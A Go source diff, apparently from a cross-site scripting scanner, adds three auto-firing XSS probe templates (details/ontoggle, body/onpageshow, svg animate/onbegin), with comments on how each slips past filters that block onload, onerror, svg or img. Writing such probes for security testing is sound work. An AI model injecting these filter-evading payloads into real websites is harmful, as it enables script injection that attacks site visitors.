@@ -310,6 +310,29 @@ func htmlTextTemplates(a ContextAnalysis, m string) []candTemplate {
 		// already tries two shapes elsewhere.
 		onLoad(prefix+"<img src=x onerror="+m+">", "<>", 88,
 			prefixReason(prefix, "inject an <img> with a deliberately-broken src so its onerror handler (fires automatically, no interaction) references the marker")),
+		// <details open ontoggle=> is a third independent auto-firing vector:
+		// the toggle event fires once when the element is parsed with open
+		// already present (no click needed), so a filter that blocks "svg"
+		// and "img" but not "details" still misses this one. Also useful
+		// against filters that specifically pattern-match "on load"/"on
+		// error" strings but not "ontoggle".
+		onLoad(prefix+"<details open ontoggle="+m+">", "<>", 80,
+			prefixReason(prefix, "inject a <details open> element whose ontoggle handler fires as soon as it is parsed (open already set), referencing the marker")),
+		// <body onpageshow=> exploits the HTML parser's own merge behavior: a
+		// second <body> start tag does not open a new element — the parser
+		// copies any attributes not already present onto the page's REAL
+		// <body>, including event-handler attributes, so this works even
+		// deep inside existing body content with no need to open a fresh
+		// element. pageshow fires once after the initial load too, not only
+		// on a back/forward-cache restore.
+		onLoad(prefix+"<body onpageshow="+m+">", "<>", 76,
+			prefixReason(prefix, "inject a body start tag whose onpageshow attribute the parser merges onto the page's existing <body> element, firing on load")),
+		// <svg><animate onbegin=> auto-fires when the animation begins
+		// (default begin="0s", i.e. immediately) — a fourth independent
+		// vector for a filter that blocks onload/onerror/ontoggle/onpageshow
+		// specifically but not onbegin.
+		onLoad(prefix+"<svg><animate onbegin="+m+">", "<>", 72,
+			prefixReason(prefix, "inject an SVG <animate> element whose onbegin handler fires as soon as the (default, immediate) animation begins")),
 		markupProbe(prefix+"<"+m+"x>", "<>", 60,
 			prefixReason(prefix, "inject a marker element to detect raw markup injection without script")),
 	}
